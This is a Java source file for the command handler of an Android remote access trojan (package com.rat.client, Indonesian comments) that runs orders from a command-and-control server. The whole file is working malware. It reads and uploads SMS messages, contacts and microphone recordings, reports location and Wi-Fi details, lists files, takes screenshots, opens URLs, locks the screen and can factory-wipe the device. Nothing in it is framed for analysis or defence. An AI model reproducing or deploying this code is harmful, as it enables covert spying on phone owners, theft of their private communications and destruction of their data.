// language: Java, file: CommandHandler.java, target: Android API 21+
// Eksekusi semua command dari C2
package com.rat.client;

import android.content.*;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.hardware.camera2.*;
import android.location.*;
import android.media.*;
import android.net.wifi.*;
import android.os.*;
import android.provider.*;
import android.telephony.*;
import androidx.core.content.ContextCompat;
import android.Manifest;
import android.content.pm.PackageManager;
import org.json.*;
import java.io.*;
import java.util.*;

public class CommandHandler {

    private final Context ctx;
    private final String  deviceId;
    private MediaRecorder recorder;
    private boolean keylogActive = false;

    public CommandHandler(Context ctx, String deviceId) {
        this.ctx      = ctx;
        this.deviceId = deviceId;
    }

    public void execute(String cmd, String params, int cmdId) {
        new Thread(() -> {
            String result = "ok";
            try {
                switch (cmd) {
                    case "lock_screen":    result = lockScreen();          break;
                    case "vibrate":        result = vibrate();             break;
                    case "screenshot":     result = screenshot(cmdId);     break;
                    case "get_location":   result = getLocation();         break;
                    case "get_sms":        result = getSms();              break;
                    case "get_contacts":   result = getContacts();         break;
                    case "get_wifi":       result = getWifi();             break;
                    case "get_files":      result = getFiles(params);      break;
                    case "get_notifs":     result = "notif_listener";      break;
                    case "keylog_start":   keylogActive = true;            break;
                    case "keylog_stop":    keylogActive = false;           break;
                    case "record_start":   result = recordStart();         break;
                    case "record_stop":    result = recordStop(cmdId);     break;
                    case "open_url":       openUrl(params);                break;
                    case "wipe_data":      wipeData();                     break;
                    case "uninstall":      uninstall();                    break;
                    default:               result = "unknown_cmd";
                }
            } catch (Exception e) {
                result = "error: " + e.getMessage();
            }
            sendResult(cmdId, result);
        }).start();
    }

    // --- LOCK SCREEN ---
    private String lockScreen() {
        DevicePolicyManager dpm = (DevicePolicyManager)
            ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm != null) dpm.lockNow();
        return "locked";
    }

    // --- VIBRATE ---
    private String vibrate() {
        Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
        if (v != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                v.vibrate(VibrationEffect.createOneShot(1000,
                    VibrationEffect.DEFAULT_AMPLITUDE));
            else v.vibrate(1000);
        }
        return "vibrated";
    }

    // --- SCREENSHOT (via MediaProjection — perlu permission di MainActivity) ---
    private String screenshot(int cmdId) {
        // screenshot disimpan lewat ScreenCaptureService yang terpisah
        // kirim broadcast ke service
        ctx.sendBroadcast(new Intent("com.rat.client.SCREENSHOT")
            .putExtra("cmd_id", cmdId));
        return "screenshot_requested";
    }

    // --- GET LOCATION ---
    private String getLocation() {
        if (ContextCompat.checkSelfPermission(ctx,
                Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) return "no_permission";

        LocationManager lm = (LocationManager)
            ctx.getSystemService(Context.LOCATION_SERVICE);
        Location loc = null;
        if (lm != null) {
            loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null)
                loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        }
        if (loc == null) return "location_unavailable";
        return "lat=" + loc.getLatitude() + ",lng=" + loc.getLongitude()
            + ",acc=" + loc.getAccuracy();
    }

    // --- GET SMS ---
    private String getSms() {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) return "no_permission";

        JSONArray arr = new JSONArray();
        Cursor c = ctx.getContentResolver().query(
            Uri.parse("content://sms/inbox"),
            new String[]{"address","body","date"}, null, null, "date DESC LIMIT 100");
        if (c != null) {
            while (c.moveToNext()) {
                JSONObject o = new JSONObject();
                try {
                    o.put("address", c.getString(0));
                    o.put("body",    c.getString(1));
                    o.put("date",    c.getLong(2));
                    arr.put(o);
                } catch (Exception ignored) {}
            }
            c.close();
        }

        // upload ke server
        Map<String, String> p = new HashMap<>();
        p.put("action",    "upload_sms");
        p.put("device_id", deviceId);
        p.put("data",      arr.toString());
        ApiClient.post(p);
        return "sms_uploaded:" + arr.length();
    }

    // --- GET CONTACTS ---
    private String getContacts() {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) return "no_permission";

        JSONArray arr = new JSONArray();
        Cursor c = ctx.getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            new String[]{
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            }, null, null, null);
        if (c != null) {
            while (c.moveToNext()) {
                JSONObject o = new JSONObject();
                try {
                    o.put("name",  c.getString(0));
                    o.put("phone", c.getString(1));
                    arr.put(o);
                } catch (Exception ignored) {}
            }
            c.close();
        }

        Map<String, String> p = new HashMap<>();
        p.put("action",    "upload_contacts");
        p.put("device_id", deviceId);
        p.put("data",      arr.toString());
        ApiClient.post(p);
        return "contacts_uploaded:" + arr.length();
    }

    // --- GET WIFI ---
    private String getWifi() {
        WifiManager wm = (WifiManager)
            ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wm == null) return "no_wifi_manager";
        WifiInfo info = wm.getConnectionInfo();
        return "ssid=" + info.getSSID()
            + ",bssid=" + info.getBSSID()
            + ",ip=" + intToIp(info.getIpAddress())
            + ",signal=" + info.getRssi();
    }

    // --- GET FILES ---
    private String getFiles(String path) {
        if (path == null || path.isEmpty())
            path = Environment.getExternalStorageDirectory().getAbsolutePath();
        File dir = new File(path);
        if (!dir.exists() || !dir.isDirectory()) return "invalid_path";
        JSONArray arr = new JSONArray();
        File[] files = dir.listFiles();
        if (files != null) {
            for (File f : files) {
                JSONObject o = new JSONObject();
                try {
                    o.put("name",  f.getName());
                    o.put("path",  f.getAbsolutePath());
                    o.put("size",  f.length());
                    o.put("isDir", f.isDirectory());
                    arr.put(o);
                } catch (Exception ignored) {}
            }
        }
        return arr.toString();
    }

    // --- RECORD AUDIO START ---
    private String recordStart() {
        try {
            File f = new File(ctx.getCacheDir(), "rec_" + System.currentTimeMillis() + ".3gp");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(f.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            return "recording:" + f.getAbsolutePath();
        } catch (Exception e) {
            return "record_error:" + e.getMessage();
        }
    }

    // --- RECORD AUDIO STOP & UPLOAD ---
    private String recordStop(int cmdId) {
        if (recorder == null) return "not_recording";
        try {
            recorder.stop();
            recorder.release();
            // path tersimpan di nama file cache — ambil file terbaru
            File cache = ctx.getCacheDir();
            File[] recs = cache.listFiles(f -> f.getName().startsWith("rec_"));
            if (recs != null && recs.length > 0) {
                Arrays.sort(recs, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
                File rec = recs[0];
                byte[] data = readFile(rec);
                ApiClient.postFile("upload_file", deviceId, rec.getName(),
                    rec.getAbsolutePath(), data);
                rec.delete();
            }
            recorder = null;
            return "record_uploaded";
        } catch (Exception e) {
            return "stop_error:" + e.getMessage();
        }
    }

    // --- OPEN URL ---
    private void openUrl(String url) {
        Intent i = new Intent(Intent.ACTION_VIEW,
            android.net.Uri.parse(url));
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
    }

    // --- WIPE DATA ---
    private void wipeData() {
        DevicePolicyManager dpm = (DevicePolicyManager)
            ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm != null) dpm.wipeData(0);
    }

    // --- UNINSTALL ---
    private void uninstall() {
        Intent i = new Intent(Intent.ACTION_DELETE,
            android.net.Uri.parse("package:" + ctx.getPackageName()));
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
    }

    // --- HELPERS ---
    private void sendResult(int cmdId, String result) {
        if (cmdId < 0) return;
        Map<String, String> p = new HashMap<>();
        p.put("action",    "result");
        p.put("cmd_id",    String.valueOf(cmdId));
        p.put("result",    result);
        ApiClient.post(p);
    }

    private String intToIp(int ip) {
        return (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "."
            + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
    }

    private byte[] readFile(File f) throws IOException {
        FileInputStream fis = new FileInputStream(f);
        byte[] data = new byte[(int) f.length()];
        fis.read(data); fis.close();
        return data;
    }
}